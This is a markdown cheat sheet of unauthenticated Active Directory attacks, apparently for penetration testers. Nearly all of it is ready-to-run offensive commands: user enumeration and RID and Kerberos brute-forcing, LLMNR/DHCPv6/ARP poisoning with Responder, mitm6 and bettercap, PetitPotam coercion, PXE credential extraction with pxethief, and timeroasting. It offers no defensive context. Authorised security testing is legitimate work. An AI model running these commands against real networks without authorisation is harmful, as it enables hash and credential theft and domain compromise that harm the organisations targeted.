## No Credentials (Users / Poisoning / Coerce / PXE)
### Enumerate Users

- `nxc smb <dc_ip> --users`
- `nxc smb <dc_ip> --rid-brute 10000`
- `net rpc group members 'Domain Users' -W '<domain>' -I <ip> -U '%'`

➔ Username

## Bruteforce Users
- `kerbrute userenum -d <domain> <userlist>`
- `nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<user_list_file>" <dc_ip>`

➔ Username

## Poisoning
- LLMNR / NBTNS / MDNS
- `responder -I <interface>`

## DHCPv6 (IPv6 preferred to IPv4)
- `mitm6 -d <domain>`
- bettercap

## ARP Poisoning
- bettercap
- asreqroast ➔ `Pcredz -i <interface> -v` ➔ Hash found ASREQ

➔ Poisoning SMB / Poisoning LDAP / Poisoning HTTP

## Coerce
- Unauthenticated PetitPotam (CVE-2022-26925)
- `petitpotam.py -d <domain> <listener> <target>`

➔ Coerce SMB

## PXE
### No Password
- `pxethief.py 1`
- `pxethief.py 2 <distribution_point_ip>`

➔ Credentials (NAA account)

## Password Protected
- `tftp -i <dp_ip> GET "\xxx\boot.var"`
- `pxethief.py 5 '\xxx\boot.var'`

➔ PXE Hash

- timeRoasting
- `timeroast.py <dc_ip> -o <output_log>`

➔ Timeroast Hash
